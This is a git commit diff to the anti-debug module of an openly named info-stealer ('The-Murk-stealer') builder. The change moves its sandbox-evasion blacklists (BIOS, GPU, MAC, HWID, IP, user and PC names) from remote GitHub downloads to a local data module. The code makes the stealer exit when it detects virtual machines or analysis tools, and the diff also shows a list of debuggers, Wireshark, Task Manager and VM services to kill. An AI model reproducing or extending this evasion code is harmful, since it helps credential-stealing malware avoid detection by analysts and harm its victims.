66a328b943d456856757fdf28c5fcdec865cdac2
Nick Vinesmoke <darkdedpro@gmail.com>
2023-10-04 14:54:32 +0300

    modules fixed

--- builder/Modules_extracted/scripts/secure/antiDebug.py
+++ builder/Modules_extracted/scripts/secure/antiDebug.py
@@ -19,69 +19,11 @@ import subprocess
 import requests
 import platform
 import json
+import data
 
 
-try:
-    blacklisted_Bios = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Bios.txt').text.replace('\r', '').split('\n'))
-except:
-    blacklisted_Bios = []
-try:
-    blacklisted_Manufacture = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Manufacture.txt').text.replace('\r', '').split('\n'))
-except:
-    blacklisted_Manufacture = []
-try:   
-    blacklisted_BaseBoard = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_BaseBoard.txt').text.replace('\r', '').split('\n'))
-except:
-    blacklisted_BaseBoard = []
-try:
-    blacklisted_CPU = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_CPU.txt').text.replace('\r', '').split('\n'))
-except:
-    blacklisted_CPU = []
-try:
-    blacklisted_Drive = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Drive.txt').text.replace('\r', '').split('\n'))
-except:
-    blacklisted_Drive = []
-try:
-    blacklisted_HW_Profile_GUID = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_HW_Profile_GUID.txt').text.replace('\r', '').split('\n'))
-except:
-    blacklisted_HW_Profile_GUID = []
-try:
-    blacklisted_Machine_GUID = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Machine_GUID.txt').text.replace('\r', '').split('\n'))
-except:
-    blacklisted_Machine_GUID = []
-try:
-    blacklisted_Processes = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Processes.txt').text.replace('\r', '').split('\n'))
-except:
-    blacklisted_Processes = []
-try:
-    blacklisted_GPU = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_GPU.txt').text.replace('\r', '').split('\n'))
-except:
-    blacklisted_GPU = []
-try:
-    blacklisted_HWID = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_HWID.txt').text.replace('\r', '').split('\n'))
-except:
-    blacklisted_HWID = []
-try:
-    blacklisted_ip = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_ip.txt').text.replace('\r', '').split('\n'))
-except:
-    blacklisted_ip = []
-try:
-    blacklisted_Mac_Address = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Mac_Address.txt').text.replace('\r', '').split('\n'))
-except:
-    blacklisted_Mac_Address = []
-try:
-    blacklisted_PC_Name = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_PC_Name.txt').text.replace('\r', '').split('\n'))
-except:
-    blacklisted_PC_Name = []
-try:
-    blacklisted_Platform = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Platform.txt').text.replace('\r', '').split('\n'))
-except:
-    blacklisted_Platform = []
-try:
-    blacklisted_Users = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Users.txt').text.replace('\r', '').split('\n'))
-except:
-    blacklisted_Users = []
-    
+
+
 kill_Processes =["httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]
 
 
@@ -221,65 +163,63 @@ def AntiDebug(oneStart):
 
     processlist = psutil.process_iter(['name'])
 
-    if os.getenv("USERPROFILE") in blacklisted_Users:
+    if os.getenv("USERPROFILE") in data.blacklisted_Users:
         os._exit(0)
 
 
-    if os.getenv('COMPUTERNAME') in blacklisted_PC_Name:
+    if os.getenv('COMPUTERNAME') in data.blacklisted_PC_Name:
         os._exit(0)
 
 
-    if checkHWID() in blacklisted_HWID:
+    if checkHWID() in data.blacklisted_HWID:
         os._exit(0)
 
 
-    if checkMAC() in blacklisted_Mac_Address:
+    if checkMAC() in data.blacklisted_Mac_Address:
         os._exit(0)
 
 
     for exe in processlist:
-        if exe.info.get('name') in blacklisted_Processes:
+        if exe.info.get('name') in data.blacklisted_Processes:
             os._exit(0)
 
-    if checkBIOS() in blacklisted_Bios:
+    if checkBIOS() in data.blacklisted_Bios:
         os._exit(0)
 
     
-    if checkManufacture() in blacklisted_Manufacture:
+    if checkManufacture() in data.blacklisted_Manufacture:
         os._exit(0)
 
 
-    if checkBASE() in blacklisted_BaseBoard:
+    if checkBASE() in data.blacklisted_BaseBoard:
         os._exit(0)
 
 
-    if checkCPU() in blacklisted_CPU:
+    if checkCPU() in data.blacklisted_CPU:
         os._exit(0)
 
 
-    if checkDrive() in blacklisted_Drive:
+    if checkDrive() in data.blacklisted_Drive:
         os._exit(0)
 
 
-    if checkHW_profile() in blacklisted_HW_Profile_GUID:
+    if checkHW_profile() in data.blacklisted_HW_Profile_GUID:
         os._exit(0)
  
 
 
-    if checkGUID() in blacklisted_Machine_GUID:
+    if checkGUID() in data.blacklisted_Machine_GUID:
         os._exit(0)
 
     gpus = checkGPU()
     for gpu in gpus:
-        if gpu in blacklisted_GPU:
+        if gpu in data.blacklisted_GPU:
             os._exit(0)
 
-
-
-    if checkIP() in blacklisted_ip:
+    if checkIP() in data.blacklisted_ip:
         os._exit(0)
 
-    if checkPlatform() in blacklisted_Platform:
+    if checkPlatform() in data.blacklisted_Platform:
         os._exit(0)
     
     for proc in processlist:
